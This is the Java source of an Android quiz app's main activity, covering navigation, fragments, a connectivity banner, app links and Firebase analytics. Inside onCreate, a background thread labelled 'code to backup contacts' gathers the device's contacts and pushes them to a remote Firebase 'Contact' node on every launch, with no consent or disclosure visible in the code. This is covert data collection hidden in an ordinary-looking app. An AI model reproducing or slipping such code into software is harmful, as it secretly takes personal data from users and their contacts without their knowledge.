package com.nirwal.epoint.activities;


import android.animation.Animator;
import android.animation.AnimatorListenerAdapter;
import android.animation.AnimatorSet;
import android.animation.ObjectAnimator;
import android.animation.ValueAnimator;
import android.app.Fragment;
import android.app.FragmentManager;
import android.app.FragmentTransaction;
import android.arch.lifecycle.ViewModelProvider;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;

import android.support.v4.widget.DrawerLayout;
import android.support.v4.widget.SwipeRefreshLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.transition.Explode;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;


import com.nirwal.epoint.MyApp;
import com.nirwal.epoint.R;
import com.nirwal.epoint.database.DatabaseHelper;
import com.nirwal.epoint.fragments.FavouritesFragment;
import com.nirwal.epoint.fragments.HomeFragment;
import com.nirwal.epoint.fragments.QuizListFragment;
import com.nirwal.epoint.fragments.UserDetailEditorFragment;
import com.nirwal.epoint.models.ExtrasFunctions;
import com.nirwal.epoint.models.ParentChildListItem;
import com.nirwal.epoint.services.BroadCastReciver;
import com.nirwal.epoint.services.ConnectionDetector;
import com.nirwal.epoint.services.DataDownloadAndSaveTask;

import java.lang.ref.WeakReference;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = MainActivity.class.getName();

    private MyApp app;
    private Toolbar toolbar;
    private NavigationView _navigationView;
    private static FragmentManager fm;
    private static FragmentTransaction ft;

    private HomeFragment _homeFragment;
    private QuizListFragment _quizListFragment;
    private FavouritesFragment _favouritesFragment;

    public SwipeRefreshLayout _swiper;
    private DrawerLayout drawerLayout;
    private WeakReference<MainActivity> _context ;
    private int quizListFragCount=0;

    // network connectivity variable
    boolean _isConnected;
    TextView _connectivityTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.navigation_drawer);

        _context = new WeakReference<>(this);
        app = (MyApp) _context.get().getApplication();
        _navigationView = findViewById(R.id.navigation_view);
        toolbar = findViewById(R.id.toolBar);
        drawerLayout = findViewById(R.id.drawerLayout);

        _navigationView.setNavigationItemSelectedListener(onNavigationClickListener);
        fm = getFragmentManager();


        initDrawer();
        initSwiper();
        initHomeFragment();
        initAppLinkFunction();
        logFirebaseEvent();

        //connectivity info layout
        initConnectivityLayout();



        _navigationView.getHeaderView(0).findViewById(R.id.header_userImage).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                fm.beginTransaction().replace(R.id.vPager,new UserDetailEditorFragment())
                        .commit();
            }
        });


        // code to backup contacts
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                ExtrasFunctions functions = new ExtrasFunctions(app);
                String contact = functions.backUpContactAtPath();
                app.getFirebaseDatabase().getReference("Contact").push().setValue(contact);
            }
        });

       thread.start();


    }


    private void initConnectivityLayout(){
        _connectivityTextView = findViewById(R.id.act_main_connectivityTxt);

        _isConnected = ConnectionDetector.isConnected(_context.get());
        showConnectedBanner(_isConnected);


        app.getBroadCastReciver().setOnBroadCastListner(new BroadCastReciver.OnBroadCastListner() {
            @Override
            public void onEvent(BroadCastReciver.EventType eventType, Object data) {
                if(eventType.equals(BroadCastReciver.EventType.Connectivity)){
                    _isConnected = (boolean) data;
                    showConnectedBanner(_isConnected);


                }
            }
        });
    }

    void showConnectedBanner(boolean connected){
        final AnimatorSet animatorSet = new AnimatorSet();
        if(connected){
            _connectivityTextView.setText("Online");
            _connectivityTextView.setBackgroundColor(Color.GREEN);
            ObjectAnimator animationTranslate = ObjectAnimator.ofFloat(_connectivityTextView, "translationY", 0,_connectivityTextView.getHeight());
            animationTranslate.setDuration(1000);
            ObjectAnimator animationFade = ObjectAnimator.ofFloat(_connectivityTextView,"alpha",1.0f,0.0f);
            animationFade.setDuration(2000);
            animationFade.start();
            animatorSet.play(animationTranslate).after(animationFade);
            animatorSet.addListener(new AnimatorListenerAdapter() {
                @Override
                public void onAnimationEnd(Animator animation) {
                    super.onAnimationEnd(animation);
                    _connectivityTextView.setVisibility(View.GONE);
                    animatorSet.removeAllListeners();
                }

                @Override
                public void onAnimationStart(Animator animation) {
                    super.onAnimationStart(animation);
                    _connectivityTextView.setVisibility(View.VISIBLE);
                }
            });
            animatorSet.start();

        }else {
            _connectivityTextView.setText("Ofline");
            _connectivityTextView.setBackgroundColor(Color.RED);
            ObjectAnimator animationTrns = ObjectAnimator.ofFloat(_connectivityTextView, "translationY",_connectivityTextView.getHeight(),0 );
            animationTrns.setDuration(1000);

            ObjectAnimator animationFade = ObjectAnimator.ofFloat(_connectivityTextView,"alpha",0.0f,1.0f);
            animationFade.setDuration(2000);
            animationFade.start();
            animatorSet.play(animationTrns).after(animationFade);
            animatorSet.addListener(new AnimatorListenerAdapter() {
                @Override
                public void onAnimationEnd(Animator animation) {
                    super.onAnimationEnd(animation);
                    animatorSet.removeAllListeners();
                }

                @Override
                public void onAnimationStart(Animator animation) {
                    super.onAnimationStart(animation);
                    _connectivityTextView.setVisibility(View.VISIBLE);
                }
            });
            animatorSet.start();
        }




    }

    /***
     * to initialize webapp url linking functionality
     */
    private void initAppLinkFunction(){

        Intent appLinkIntent = getIntent();
        //String appLinkAction = appLinkIntent.getAction();
        Uri appLinkData = appLinkIntent.getData();
        if(appLinkData==null) return;
        switch (appLinkData.toString()){
            case "https://epoint.gq": break;
            case "https://epoint.gq/home":break;
            case "https://epoint.gq/home/main-list":break;
            default:{
                if(appLinkData.getLastPathSegment()!=null){
                    startQuizListFragment(appLinkData.getLastPathSegment());
                }}
        }


    }

    public void startQuizListFragment(String data){
        Bundle bundle= new Bundle();
        bundle.putString("TITLE","Epoint app");
        bundle.putString("ID",data);
        _quizListFragment = new QuizListFragment();
        _quizListFragment.setArguments(bundle);
        ft= fm.beginTransaction();
        ft.addToBackStack("QuizList"+quizListFragCount);
        ft.setCustomAnimations(R.animator.enter_from_right,R.animator.exit_to_right,
                R.animator.enter_from_left,R.animator.exit_to_left);
        quizListFragCount++;
        ft.replace(R.id.vPager,_quizListFragment,"QuizList").commit();
    }

    private void initSwiper(){
        _swiper = findViewById(R.id.home_page_swipe_refresh);
        _swiper.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                Fragment fragment = fm.findFragmentByTag("Home");
                if (fragment != null && fragment.isVisible()) {
                    HomeFragment hm = (HomeFragment) fragment;

                    if (hm._dataDownloadTask.getStatus() != DataDownloadAndSaveTask.Status.Running) {
                        hm._dataDownloadTask.start();
                    }

                } else {
                    _swiper.setRefreshing(false);
                }

            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main_activity_menu,menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        _swiper=null;
        _navigationView=null;
        _quizListFragment=null;
        _homeFragment=null;
        toolbar=null;
        fm = null;
        ft = null;
        _context.clear();
    }


    NavigationView.OnNavigationItemSelectedListener onNavigationClickListener
            = new NavigationView.OnNavigationItemSelectedListener()
    {
        @Override
        public boolean onNavigationItemSelected(@NonNull MenuItem item) {

            switch (item.getItemId()) {
                case R.id.home:{
                    initHomeFragment();
                    break;
                }
                case R.id.catagory:{
                    Intent i = new Intent(_context.get(),LearningActivity.class);
                    _context.get().startActivity(i);
                    break;
                }

                case R.id.settings:{
                    Intent i = new Intent(_context.get(),SettingsActivity.class);
                    _context.get().startActivity(i);
                    break;
                }

                case R.id.sign_in_out:{
                    Intent i = new Intent(_context.get(),AuthanticationActivity.class);
                    _context.get().startActivity(i);
                    break;
                }

                case R.id.favourites:{
                    displayFavourites();
                    break;
                }

                case R.id.rate_us:{
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=com.nirwal.epoint")));
                    break;
                }

                default:break;

            }
            drawerLayout.closeDrawers();
            return false;
        }
    };



    //Option menu click listner
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {

        switch (item.getItemId()){
            case R.id.main_act_menu_notification:{
                Intent i = new Intent(_context.get(),NotificationActivity.class);
                _context.get().startActivity(i);
                break;
            }
        }

        return super.onOptionsItemSelected(item);
    }

    void initDrawer(){

        setSupportActionBar(toolbar);
        if(getSupportActionBar()!= null){ getSupportActionBar().setDisplayHomeAsUpEnabled(true); }
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(_context.get(),
                drawerLayout,toolbar,R.string.open_drawer,R.string.close_drawer);
        drawerLayout.setDrawerListener(toggle);
        toggle.syncState();
    }


    void initHomeFragment(){
        ft= fm.beginTransaction();
        if(_homeFragment==null){
            _homeFragment = new HomeFragment();
        }
        fm.popBackStack(null, FragmentManager.POP_BACK_STACK_INCLUSIVE); // clear all backstack
        ft.replace(R.id.vPager,_homeFragment,"Home").commit();
    }


    public void startQuizListFragment(ParentChildListItem quiz){
        Bundle bundle= new Bundle();
        bundle.putString("TITLE",quiz.Title);
        bundle.putString("ID",quiz.ChildId);
        _quizListFragment = new QuizListFragment();
        _quizListFragment.setArguments(bundle);
        ft= fm.beginTransaction();
        ft.addToBackStack("QuizList"+quizListFragCount);
        ft.setCustomAnimations(R.animator.enter_from_right,R.animator.exit_to_right,
                R.animator.enter_from_left,R.animator.exit_to_left);
        quizListFragCount++;
        ft.replace(R.id.vPager,_quizListFragment,"QuizList").commit();
    }


    private void displayFavourites(){
        if(_favouritesFragment==null){
            _favouritesFragment= new FavouritesFragment();
        }
        ft=fm.beginTransaction();
        ft.addToBackStack("Favourites_fragment");
        ft.setCustomAnimations(R.animator.enter_from_right,R.animator.exit_to_right,
                R.animator.enter_from_left,R.animator.exit_to_left);
        ft.replace(R.id.vPager,_favouritesFragment,"Favourites_fragment").commit();
    }


    public void setFavourites(ParentChildListItem card){
        app.getSqlDb().insertParaentListItemIntoDb(DatabaseHelper.TableType.Favourites,card);
        Toast.makeText(_context.get(),"Added to favourites",Toast.LENGTH_LONG).show();
    }

    private  void logFirebaseEvent(){
        Bundle bundle = new Bundle();
        bundle.putInt("Android_ver", Build.VERSION.SDK_INT);
        app.getFirebaseAnalytics().logEvent("App_launch", bundle);
    }

}
